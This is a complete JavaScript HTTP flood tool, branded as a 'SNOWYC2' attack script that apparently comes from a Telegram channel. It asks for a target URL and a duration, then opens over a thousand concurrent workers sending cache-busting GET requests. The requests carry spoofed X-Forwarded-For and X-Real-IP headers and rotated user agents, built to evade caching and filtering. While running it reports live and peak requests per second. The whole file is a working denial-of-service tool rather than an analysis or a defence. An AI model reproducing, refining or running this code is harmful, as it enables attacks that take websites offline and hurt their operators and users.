const axios = require('axios');
const fs = require('fs');
const os = require('os');
const http = require('http');
const https = require('https');
const process = require('process');

const MAX_CONCURRENT = Math.min(os.cpus().length * 154, 1540);
const MAX_REQUESTS_PER_WORKER = 5000;
const STREAMS = 4;
const REQUEST_TIMEOUT = 8000;

const USER_AGENTS = fs.readFileSync('ua.txt', 'utf8')
    .split('\n')
    .map(u => u.trim())
    .filter(Boolean);

const REFERERS = fs.readFileSync('refs.txt', 'utf8')
    .split('\n')
    .map(r => r.trim())
    .filter(Boolean);

const keepAliveHttp = new http.Agent({ keepAlive: true });
const keepAliveHttps = new https.Agent({ keepAlive: true });

const getRandomUA = () => {
    const ua1 = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0';
    const ua2 = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0';
    return `${ua1}, ${ua2}`;
};

const getRandomReferer = () => {
    return REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com';
};

const makeRequest = (target, stats) => {
    const randomIP = Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.');
    const headers = {
        'User-Agent': getRandomUA(),
        'Referer': getRandomReferer(),
        'X-Forwarded-For': randomIP,
        'X-Real-IP': randomIP,
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive'
    };

    const urlWithNoise = target + (target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2, 15)}`;

    axios.get(urlWithNoise, {
        headers,
        timeout: REQUEST_TIMEOUT,
        httpAgent: keepAliveHttp,
        httpsAgent: keepAliveHttps,
        validateStatus: null
    }).then(res => {
        stats.success++;
    }).catch(() => {
        stats.errors++;
    }).finally(() => {
        stats.total++;
    });
};

const startWorker = async (target, stats) => {
    for (let sent = 0; sent < MAX_REQUESTS_PER_WORKER; sent += STREAMS) {
        for (let i = 0; i < STREAMS; i++) {
            makeRequest(target, stats);
        }
    }
};

(async () => {
    const readline = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const ask = (q) => new Promise(resolve => readline.question(q, resolve));

    const targetInput = await ask("TARGET: ");
    let target = targetInput.trim();
    if (!target.startsWith("http")) {
        target = "http://" + target;
    }

    const durationInput = await ask("TIME: ");
    readline.close();

    const duration = parseInt(durationInput);
    if (isNaN(duration)) {
        console.log("Invalid time input.");
        return;
    }

    const stats = {
        total: 0,
        success: 0,
        errors: 0,
        peakRps: 0
    };

    const startTime = Date.now();
    const endTime = startTime + duration * 1000;

    console.clear();
    console.log('\n  SNOWYC2 - T.ME/STSVKINGDOM');
    console.log('  ============================================');
    console.log(`  TARGET: ${target}`);
    console.log(`  TIME:   ${duration}s`);
    console.log(`  MODE:   HYPER BLITZ - ${MAX_CONCURRENT} Workers × ${STREAMS} Streams`);
    console.log('  ============================================\n');

    let lastTotal = 0;
    const statInterval = setInterval(() => {
        const currentRps = (stats.total - lastTotal) / 0.2;
        lastTotal = stats.total;
        stats.peakRps = Math.max(stats.peakRps, currentRps);
        process.stdout.write(
            `\r  SENT: ${stats.total} | 200 OK: ${stats.success} | ERR: ${stats.errors} | RPS: ${currentRps.toFixed(1)} `
        );
    }, 200);

    const workers = [];
    for (let i = 0; i < MAX_CONCURRENT; i++) {
        workers.push(startWorker(target, stats));
    }

    await Promise.all(workers);
    clearInterval(statInterval);

    const elapsed = (Date.now() - startTime) / 1000;
    const avgRps = stats.total / elapsed;

    console.log('\n\n  ATTACK FINISHED');
    console.log('  ============================================');
    console.log(`  TIME:        ${elapsed.toFixed(1)}s`);
    console.log(`  TOTAL:       ${stats.total}`);
    console.log(`  SUCCESS:     ${stats.success}`);
    console.log(`  ERRORS:      ${stats.errors}`);
    console.log(`  AVG RPS:     ${avgRps.toFixed(1)}`);
    console.log(`  PEAK RPS:    ${stats.peakRps.toFixed(1)}`);
    console.log('  ============================================\n');
})();
